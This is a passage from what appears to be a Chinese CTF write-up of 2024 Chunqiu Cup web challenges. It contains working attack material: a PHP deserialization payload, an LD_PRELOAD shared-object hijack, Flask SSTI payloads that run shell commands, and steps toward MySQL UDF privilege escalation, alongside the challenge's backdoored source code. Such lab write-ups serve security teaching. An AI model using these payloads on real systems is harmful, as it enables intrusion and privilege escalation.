class-name">ENV</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然而没弹出shell</p><p>可以用下面的payload看一下LD_PRELOAD当前的值：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ENV"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"value"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"math"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"stdClass"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现LD_PRELOAD是空的，看来是没写成</p><p>hint.txt的内容：<code>RCE!!!!!!!?????? Try every possible means!!!!! Remote Code Execution!!!! THIS_IS_FAKE_CAT!!!!</code></p><p>说明这里不能直接劫持cat命令</p><p>那就考虑劫持系统新进程来绕过，测试发现好像不出网，那么直接写文件带外即可</p><p>hack.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">preload</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls / > /var/www/html/1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-shared</span> <span class="token parameter variable">-fPIC</span> hack.c <span class="token parameter variable">-o</span> evil.so <span class="token parameter variable">-ldl</span>base64 evil.so <span class="token parameter variable">-w</span> <span class="token number">0</span> <span class="token operator">></span><span class="token number">1</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706012644782.png" alt="image-20240706012644782"></p><p>得到flag的位置：&#x2F;flag_9e6244c7d4c5bd9cf815</p><p>故技重施即可得到flag</p><hr><h2 id="brother"><a href="#brother" class="headerlink" title="brother"></a>brother</h2><p>进去，直接给了个参数<code>name</code>，看了下框架是python的flask，那直接猜ssti</p><p>测了下发现没过滤，直接传payload弹shell</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现又弹不了，看来不出网</p><p>先读几个文件</p><p><a href="http://www.py/">www.py</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> render_template_stringapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">inedx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/?name=hello"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>name<span class="token punctuation">)</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>api.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">,</span> time<span class="token punctuation">,</span> threading<span class="token punctuation">,</span> socket<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">mysql_keepalive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    config <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'user'</span><span class="token punctuation">:</span> <span class="token string">'ctf'</span><span class="token punctuation">,</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'123456'</span><span class="token punctuation">,</span>        <span class="token string">'host'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>        <span class="token string">'database'</span><span class="token punctuation">:</span> <span class="token string">'mysql'</span><span class="token punctuation">,</span>        <span class="token string">'port'</span><span class="token punctuation">:</span> <span class="token number">6666</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        db_connection <span class="token operator">=</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token operator">**</span>config<span class="token punctuation">)</span>        cursor <span class="token operator">=</span> db_connection<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>Error <span class="token keyword">as</span> err<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT VERSION();"</span><span class="token punctuation">)</span>            cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>Error <span class="token keyword">as</span> err<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"连接中断: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>err<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">handle_client_connection</span><span class="token punctuation">(</span>client_socket<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            client_socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'&#123;"code":0, "path": ""&#125;'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error handling client: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">update_api</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    server_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    host <span class="token operator">=</span> <span class="token string">'0.0.0.0'</span>    port <span class="token operator">=</span> <span class="token number">7777</span>    server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"update_api Listening on port </span><span class="token interpolation"><span class="token punctuation">&#123;</span>port<span class="token punctuation">&#125;</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        client_socket<span class="token punctuation">,</span> addr <span class="token operator">=</span> server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>        handle_client_connection<span class="token punctuation">(</span>client_socket<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/evil'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> key <span class="token operator">==</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./evil.key"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"ok"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"key error"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>mysql_keepalive<span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>update_api<span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看起来是本地连接数据库的接口</p><p>update.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> json<span class="token keyword">import</span> socket<span class="token keyword">import</span> tarfile<span class="token keyword">def</span> <span class="token function">extract_specific_file</span><span class="token punctuation">(</span>tar_path<span class="token punctuation">,</span> file_name<span class="token punctuation">,</span> extract_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> tarfile<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>tar_path<span class="token punctuation">,</span> <span class="token string">"r:gz"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> tar<span class="token punctuation">:</span>        file_info <span class="token operator">=</span> tar<span class="token punctuation">.</span>getmember<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>        tar<span class="token punctuation">.</span>extract<span class="token punctuation">(</span>file_info<span class="token punctuation">,</span> path<span class="token operator">=</span>extract_path<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        js <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> js<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            extract_specific_file<span class="token punctuation">(</span>js<span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'new.bin'</span><span class="token punctuation">,</span> <span class="token string">"/updatedir"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'Error'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还有evil.key和sql-proxy.jar</p><p>明显flag没权限读</p><p>那把这个jar包导到本地看看</p><p>Main.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctf</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Base64ClassLoader</span> base64ClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Base64ClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> cls <span class="token operator">=</span> base64ClassLoader<span class="token punctuation">.</span><span class="token function">loadClassFromBase64</span><span class="token punctuation">(</span><span class="token string">"yv66vgAAADcArQoAIQBZCQAgAFoIAFsHAFwKAAQAXQoABABeCQBfAGAKAAoAYQoAYgBjBwBkCgAKAGUHAGYSAAAAawoADABsCgAMAG0SAAEAawcAbwoAEQBwBwBxCgAEAHIKABMAcwoACgB0CgAKAHUKAEwAdgoAIAB3CgBNAHIKAEwAcgoACgByCgBNAHgKAE0AeQoAIAB6BwB7BwB8AQABYwEAAUkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAMc291cmNlU29ja2V0AQARTGphdmEvbmV0L1NvY2tldDsBABFkZXN0aW5hdGlvblNvY2tldAEAE3NvdXJjZVRvRGVzdGluYXRpb24BABJMamF2YS9sYW5nL1RocmVhZDsBABNkZXN0aW5hdGlvblRvU291cmNlAQAFdmFyMTABABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR2YXI5AQAVTGphdmEvbGFuZy9UaHJvd2FibGU7AQAFdmFyMTEBAAxzZXJ2ZXJTb2NrZXQBABdMamF2YS9uZXQvU2VydmVyU29ja2V0OwEABXZhcjEyAQAEdGhpcwEAD0xjb20vY3RmL1Byb3h5OwEACnNvdXJjZVBvcnQBAA9kZXN0aW5hdGlvbkhvc3QBABJMamF2YS9sYW5nL1N0cmluZzsBAA9kZXN0aW5hdGlvblBvcnQBAA1TdGFja01hcFRhYmxlBwB9AQALZm9yd2FyZERhdGEBACUoTGphdmEvbmV0L1NvY2tldDtMamF2YS9uZXQvU29ja2V0OylWAQAGYnVmZmVyAQACW0IBAARyZWFkAQAEdmFyOAEADG91dHB1dFN0cmVhbQEAFkxqYXZhL2lvL091dHB1dFN0cmVhbTsBAAR2YXI3AQALaW5wdXRTdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAtpbnB1dFNvY2tldAEADG91dHB1dFNvY2tldAcAfgcAfwcAQgEABHNlbmQBABwoTGphdmEvaW8vT3V0cHV0U3RyZWFtO1tCSSlWAQABbwEABGRhdGEBAApFeGNlcHRpb25zBwCAAQAMbGFtYmRhJG5ldyQxAQAMbGFtYmRhJG5ldyQwAQAKU291cmNlRmlsZQEAClByb3h5LmphdmEMACQAJQwAIgAjAQAJMTI3LjAuMC4xAQAVamF2YS9uZXQvU2VydmVyU29ja2V0DAAkAIEMAIIAgwcAhAwAhQCGDACHAIgHAIkMAIoAiwEAD2phdmEvbmV0L1NvY2tldAwAJACMAQAQamF2YS9sYW5nL1RocmVhZAEAEEJvb3RzdHJhcE1ldGhvZHMPBgCNEAAlDwcAjgwAjwCQDAAkAJEMAJIAJQ8HAJMBABNqYXZhL2xhbmcvRXhjZXB0aW9uDACUACUBABNqYXZhL2xhbmcvVGhyb3dhYmxlDACVACUMAJYAlwwAmACZDACaAJsMAEMAnAwATwBQDACdAJ4MAJ8AJQwAPwBAAQANY29tL2N0Zi9Qcm94eQEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JbnB1dFN0cmVhbQEAFGphdmEvaW8vT3V0cHV0U3RyZWFtAQATamF2YS9pby9JT0V4Y2VwdGlvbgEABChJKVYBAAZhY2NlcHQBABMoKUxqYXZhL25ldC9Tb2NrZXQ7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAFmdldFJlbW90ZVNvY2tldEFkZHJlc3MBABooKUxqYXZhL25ldC9Tb2NrZXRBZGRyZXNzOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvT2JqZWN0OylWAQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgoAoAChCgAgAKIBAANydW4BAEcoTGNvbS9jdGYvUHJveHk7TGphdmEvbmV0L1NvY2tldDtMamF2YS9uZXQvU29ja2V0OylMamF2YS9sYW5nL1J1bm5hYmxlOwEAFyhMamF2YS9sYW5nL1J1bm5hYmxlOylWAQAFc3RhcnQKACAAowEAD3ByaW50U3RhY2tUcmFjZQEABWNsb3NlAQANYWRkU3VwcHJlc3NlZAEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAA9nZXRPdXRwdXRTdHJlYW0BABgoKUxqYXZhL2lvL091dHB1dFN0cmVhbTsB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"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cls<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>那么我们先尝试连接一下数据库</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"mysql -uctf -p'123456' -e 'show databases;'"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功连接</p><p>接下来尝试udf提权</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'mysql -uctf -p\'123456\' -e \'show variables like "%plugin%";\''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706022300239.png" alt="image-20240706022300239"></p><p>路径在<code>/usr/lib/mysql/plugin/</code></p><p>写入so文件</p><pre class="line-numbers language-sql" 